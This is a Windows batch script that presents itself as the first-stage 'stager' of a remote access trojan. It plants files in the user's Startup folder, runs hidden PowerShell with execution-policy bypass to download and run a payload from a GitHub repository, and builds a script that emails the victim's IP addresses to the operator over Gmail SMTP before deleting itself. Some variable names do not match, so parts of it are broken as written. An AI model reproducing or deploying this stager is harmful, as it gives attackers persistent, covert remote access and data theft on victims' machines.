@echo off
@REM initial stager for RAT
@REM created by: Sunnickel
@REM inspired by: COSMO

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into Startup Dir
cd "%STARTUP%"

@REM write payloads to startup
powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/wget.cmd -OutFile wget.cmd" 

@REM setup smtp
echo $uname = "example@gmail.com"  >> smtp.txt
echo $pword =  "example" >> smtp.txt
echo >> smtp.txt
echo $ipEthernet = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Ethernet*).IPAddress >> smtp.txt
echo $ipWlan = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias WLAN).IPAddress >> smtp.txt
echo echo "Ethernet: $ipEthernet WLan: $ipWlan" > $env:UserName.rat >> smtp.txt
echo # email process >> smtp.txt
echo $subject = "$env:UserName logs" >> smtp.txt
echo $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587"); >> smtp.txt
echo $smtp.EnableSSL = $true >> smtp.txt
echo $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password); >> smtp.txt
echo $smtp.Send($email, $email, $subject, $ip); >> smtp.txt


@REM run payload
powershell ./wget.cmd

@REM cd change back to initial location
cd "%INITIALPATH%"
del initial.cmd